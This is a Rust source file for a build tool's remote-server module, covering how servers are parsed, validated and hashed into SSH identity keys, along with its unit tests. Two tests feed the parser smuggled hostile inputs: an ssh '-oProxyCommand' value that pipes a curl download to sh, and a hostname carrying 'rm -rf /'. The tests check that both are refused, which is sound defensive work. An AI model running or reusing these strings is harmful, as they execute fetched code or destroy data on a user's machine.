//! Remote mode: identifying and remembering the servers a developer has set up.
//!
//! `Remote` names a server the way a developer typed it — host, port, and
//! login — and [`Remote::hash`] derives a stable key from those three answers
//! so the same server always finds the same SSH identity on disk
//! (`~/.riabuild/ssh-identities/<hash>`). The `store` submodule persists what
//! has already been set up, in `remotes.json`. Later tasks add provisioning
//! and the shell handoff on top of this.
//!
//! The two key questions are two submodules on purpose, and neither reaches
//! into the other's answer: `identity` owns the key that proves who *we* are
//! to a server, `host_key` owns the key that proves who the *server* is to
//! us. Confusing the second for the first is how a developer gets phished by
//! a box that isn't theirs.

// The panic lints are denied workspace-wide. In tests a panic *is* the
// reporting mechanism for a failed precondition, so unwrapping a fixture there
// is correct and this keeps the deny from forcing ceremony into every test
// module. The exemption is `test` and nothing wider — see the workspace
// manifest for what an `any(test, feature = "testing")` spelling of it costs.
#![cfg_attr(test, allow(clippy::expect_used, clippy::panic, clippy::unwrap_used))]

mod command;
mod home;

pub use command::{NO_TMUX, env_command, env_prefix, shell_command, shell_quote};
pub use home::{resolve_home, ssh_once};

pub mod askpass;
pub mod authorise;
pub mod channel;
pub mod flow;
pub mod forget;
pub mod host_key;
pub mod identity;
pub mod install;
pub mod issued;
pub mod mosh;
pub mod pick;
pub mod render;
pub mod seed;
pub mod session;
pub mod shared;
pub mod shell;
mod ssh;
pub mod store;

pub use flow::{forget_server, list, run};

use anyhow::{Result, anyhow};
use riabuild_api::remotes;

/// What `riabuild remote` needs from the command line, named rather than parsed.
///
/// The binary fills this in from `Cli`; nothing under `remote/` sees a clap
/// type. That is not tidiness — reaching into the global `Cli` meant this
/// module could read *any* flag rather than the ones its caller chose to hand
/// over, and `--accept-host-key` had to be dug out by matching `cli.command`
/// because it is scoped to the `remote` subcommand (R13 in `decisions.md`)
/// rather than being a top-level field. Named fields make both the inputs and
/// their scope obvious, and let the tests state a case directly instead of
/// round-tripping it through an argv they then have to parse.
#[derive(Debug, Clone, Default)]
pub struct Request {
    /// A saved server's name, or `[user@]host[:port]` to add one.
    pub target: Option<String>,
    /// The host key fingerprint to trust without prompting.
    pub accept_host_key: Option<String>,
    pub check: bool,
    pub quiet: bool,
    pub no_shell: bool,
    /// Where the checkout should live *on the server*, not on this laptop.
    pub project: Option<String>,
    /// `--repo`, forwarded for the server's own riabuild to act on — it is the
    /// one that puts the picker's question, and the one that clones.
    pub repo: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Remote {
    /// A local label only. The server never sees it.
    pub name: String,
    pub host: String,
    pub port: u16,
    pub user: String,
}

impl Remote {
    /// Identifies the server for key and session storage.
    ///
    /// Hashed over the *login target* — user, host, and port — never the local
    /// `name`, so renaming a saved server never changes which key it uses.
    ///
    /// Four normalisation axes, each considered deliberately rather than left
    /// to chance:
    ///
    /// - **Case.** The host is lowercased first (ASCII-only —
    ///   [`str::to_ascii_lowercase`], not [`str::to_lowercase`]: hostnames are
    ///   ASCII or punycode, so there is no Unicode case-folding to get right or
    ///   wrong here). DNS names are case-insensitive, so `Build-01.fly.dev` and
    ///   `build-01.fly.dev` are one server; hashing the host as typed would
    ///   silently re-provision and re-authorise a server the developer already
    ///   set up, the second time they typed it slightly differently.
    /// - **Trailing dot.** A single trailing `.` is stripped before lowercasing.
    ///   `build-01.fly.dev.` is the fully-qualified spelling of
    ///   `build-01.fly.dev` — DNS treats them as the identical name — and
    ///   without this, typing (or a tool emitting) the FQDN form would fork one
    ///   server into two SSH identities.
    /// - **Port.** No equivalent treatment is needed here: [`Remote::parse`]
    ///   already fills in `22` whenever a spec omits a port, so by the time a
    ///   `Remote` exists, `host:22` and a bare `host` have already become the
    ///   same `u16`. A caller who builds a `Remote` by hand is expected to have
    ///   resolved that the same way.
    /// - **IP vs. name.** Left un-normalised, on purpose. The hash is over the
    ///   login target *as the developer typed it*, not over a resolved
    ///   address — resolving `build-01.fly.dev` to an IP before hashing would
    ///   mean the identity (and which SSH key gets used) depends on whatever
    ///   DNS answers on a given day, which is exactly the kind of cleverness
    ///   this design avoids. `10.0.0.5` and `build-01.fly.dev` are treated as
    ///   two different servers even if they currently happen to be the same
    ///   machine; that is a feature, not a gap — predictable beats resolved.
    /// - The user is left exactly as typed. Unix usernames are case-sensitive,
    ///   and `ada` and `Ada` are two different accounts, not one.
    pub fn hash(&self) -> String {
        let host = self.host.strip_suffix('.').unwrap_or(&self.host);
        let key = format!("{}@{}:{}", self.user, host.to_ascii_lowercase(), self.port);
        let digest = riabuild_fetch::download::sha256_hex(key.as_bytes());
        digest[..16].to_string()
    }

    /// `user@host`, for `ssh`/`mosh`'s target argument.
    pub fn target(&self) -> String {
        format!("{}@{}", self.user, self.host)
    }

    /// `[user@]host[:port]`, with the local login as the default user.
    ///
    /// Held to the same rules `api::remotes` holds one of the team's servers
    /// to, through the very same predicates — `is_host_char` and
    /// `is_label_char` — rather than a second copy of them. A server a
    /// developer typed is no more trustworthy than one riabuild-web served:
    /// both end up as positional arguments to `ssh` and `ssh-keyscan`.
    ///
    /// **A hostname may not begin with `-`.** riabuild runs `ssh` through
    /// `CommandRunner` with an argv and no shell, so there is nothing to
    /// inject into — but `ssh` reads a leading-dash argument as an *option*,
    /// and `-oProxyCommand=…` sitting where a hostname goes runs a command of
    /// somebody else's choosing on this laptop. The shared-server validator
    /// has refused exactly this since it was written; a typed one used to be
    /// checked for nothing but emptiness.
    pub fn parse(spec: &str, default_user: &str) -> Result<Remote> {
        let spec = spec.trim();
        if spec.is_empty() {
            return Err(anyhow!("no server given"));
        }
        let (user, rest) = match spec.split_once('@') {
            Some((user, rest)) if !user.is_empty() => (user.to_string(), rest),
            Some(_) => return Err(anyhow!("that has an empty username in it")),
            None => (default_user.to_string(), spec),
        };
        let (host, port) = match rest.rsplit_once(':') {
            Some((host, port)) => {
                let port: u16 = port
                    .parse()
                    .map_err(|_| anyhow!("`{port}` is not a port number"))?;
                if port == 0 {
                    return Err(anyhow!("0 is not a port number"));
                }
                (host.to_string(), port)
            }
            None => (rest.to_string(), 22),
        };
        if host.is_empty() {
            return Err(anyhow!("that has no hostname in it"));
        }
        // Before the character check, so the message names the actual danger
        // rather than reporting a `-` as an unusual character.
        if host.starts_with('-') {
            return Err(anyhow!(
                "`{host}` would be read as an ssh option, not a hostname"
            ));
        }
        if host.len() > 253 || !host.chars().all(remotes::is_host_char) {
            return Err(anyhow!("`{host}` is not a hostname"));
        }
        if user.len() > 32 || !user.chars().all(remotes::is_label_char) {
            return Err(anyhow!("`{user}` is not a username"));
        }
        let name = store::allocate_name(&host, &[]);
        Ok(Remote {
            name,
            host,
            port,
            user,
        })
    }
}

/// A server the tests across this crate's own modules are about. Defined once
/// here, beside [`Remote`], rather than in each test module that needs one.
#[cfg(test)]
pub(crate) fn remote_fixture() -> Remote {
    Remote {
        name: "build-01".into(),
        host: "build-01.fly.dev".into(),
        port: 22,
        user: "ada".into(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_same_three_answers_always_produce_the_same_key() {
        // This is what makes the whole flow safe to re-run: a second
        // `riabuild remote` finds the key it made the first time.
        let one = Remote {
            name: "build-01".into(),
            host: "build-01.fly.dev".into(),
            port: 22,
            user: "ada".into(),
        };
        let two = Remote {
            name: "anything-else".into(),
            ..one.clone()
        };
        assert_eq!(
            one.hash(),
            two.hash(),
            "the local name is not part of identity"
        );
        assert_eq!(one.hash().len(), 16);
        assert!(one.hash().chars().all(|c| c.is_ascii_hexdigit()));
    }
    #[test]
    fn a_different_user_or_port_is_a_different_server() {
        let base = Remote {
            name: "b".into(),
            host: "box".into(),
            port: 22,
            user: "ada".into(),
        };
        let other_user = Remote {
            user: "bob".into(),
            ..base.clone()
        };
        let other_port = Remote {
            port: 2222,
            ..base.clone()
        };
        let other_host = Remote {
            host: "otherbox".into(),
            ..base.clone()
        };
        assert_ne!(base.hash(), other_user.hash());
        assert_ne!(base.hash(), other_port.hash());
        assert_ne!(base.hash(), other_host.hash());
    }
    #[test]
    fn a_different_hostname_case_is_still_a_different_hash_from_a_different_host() {
        // Guards against a normalisation bug that would collapse two genuinely
        // different servers (not just two spellings of one) onto one hash.
        let a = Remote {
            name: "a".into(),
            host: "box-one".into(),
            port: 22,
            user: "ada".into(),
        };
        let b = Remote {
            name: "b".into(),
            host: "box-two".into(),
            port: 22,
            user: "ada".into(),
        };
        assert_ne!(a.hash(), b.hash());
    }
    #[test]
    fn differing_hostname_case_is_the_same_server() {
        // The other direction of the same invariant: two spellings of the
        // identical server must not fork into two SSH identities.
        let lower = Remote {
            name: "build-01".into(),
            host: "build-01.fly.dev".into(),
            port: 22,
            user: "ada".into(),
        };
        let mixed_case = Remote {
            host: "Build-01.Fly.Dev".into(),
            ..lower.clone()
        };
        let upper = Remote {
            host: "BUILD-01.FLY.DEV".into(),
            ..lower.clone()
        };
        assert_eq!(lower.hash(), mixed_case.hash());
        assert_eq!(lower.hash(), upper.hash());
    }
    #[test]
    fn a_trailing_dot_is_the_same_server() {
        // The fully-qualified spelling of a DNS name ends in `.`; DNS treats
        // `build-01.fly.dev` and `build-01.fly.dev.` as the identical name, and
        // a hash that didn't would fork one server into two SSH identities the
        // first time someone (or some tool) typed the FQDN form.
        let bare = Remote {
            name: "build-01".into(),
            host: "build-01.fly.dev".into(),
            port: 22,
            user: "ada".into(),
        };
        let fqdn = Remote {
            host: "build-01.fly.dev.".into(),
            ..bare.clone()
        };
        assert_eq!(bare.hash(), fqdn.hash());
    }
    #[test]
    fn an_explicit_default_port_is_the_same_server_as_no_port_at_all() {
        // The other normalisation this task cares about: `:22` spelled out and
        // no port at all must resolve to one identity, because they always will
        // once `Remote::parse` has filled in the default.
        let explicit = Remote::parse("ada@build-01.fly.dev:22", "ada").expect("parses");
        let implicit = Remote::parse("ada@build-01.fly.dev", "ada").expect("parses");
        assert_eq!(explicit.hash(), implicit.hash());
    }
    #[test]
    fn a_target_is_parsed_the_way_it_is_typed() {
        let parsed = Remote::parse("ada@build-01.fly.dev:2222", "local").expect("parses");
        assert_eq!(parsed.user, "ada");
        assert_eq!(parsed.host, "build-01.fly.dev");
        assert_eq!(parsed.port, 2222);
        assert_eq!(parsed.name, "build-01");

        let defaults = Remote::parse("build-01.fly.dev", "ada").expect("parses");
        assert_eq!(defaults.user, "ada");
        assert_eq!(defaults.port, 22);
    }
    #[test]
    fn nonsense_is_refused_rather_than_guessed_at() {
        assert!(Remote::parse("", "ada").is_err());
        assert!(Remote::parse("ada@", "ada").is_err());
        assert!(Remote::parse("host:not-a-port", "ada").is_err());
        assert!(Remote::parse("host:0", "ada").is_err());
        assert!(Remote::parse("host:99999", "ada").is_err());
    }
    #[test]
    fn a_hostname_ssh_would_read_as_an_option_is_refused() {
        // `remote.host` becomes a positional argument to `ssh` and
        // `ssh-keyscan`. A leading `-` turns it into an option, and
        // `-oProxyCommand=…` in that position runs a command of somebody
        // else's choosing on this laptop. riabuild-web's own servers have been
        // held to this since the validator was written; a typed one was
        // checked for nothing but emptiness.
        let error = Remote::parse("ada@-oProxyCommand=curl evil.sh|sh", "ada")
            .expect_err("a leading dash is an option, not a hostname");
        assert!(error.to_string().contains("ssh option"), "{error}");

        // …and with no `user@` in front of it either, which is the shorter
        // spelling of the same argv.
        assert!(Remote::parse("-oProxyCommand=x", "ada").is_err());
    }
    #[test]
    fn a_hostname_or_username_with_nothing_hostname_like_in_it_is_refused() {
        // The same predicates `api::remotes` holds one of the team's servers
        // to, so the two lists cannot drift apart on what a hostname is.
        assert!(Remote::parse("ada@build 01.fly.dev", "ada").is_err());
        assert!(Remote::parse("ada@build;rm -rf /", "ada").is_err());
        assert!(Remote::parse("a b@build-01.fly.dev", "ada").is_err());
        assert!(Remote::parse(&format!("ada@{}", "x".repeat(254)), "ada").is_err());

        // …and the ordinary spellings still parse, including the ones
        // `Remote::hash` normalises.
        assert!(Remote::parse("ada@build-01.fly.dev.", "ada").is_ok());
        assert!(Remote::parse("ada@Build-01.Fly.Dev:2222", "ada").is_ok());
        assert!(Remote::parse("10.0.0.5", "ada").is_ok());
        assert!(Remote::parse("build-01", "ada_b.c-d").is_ok());
    }
}
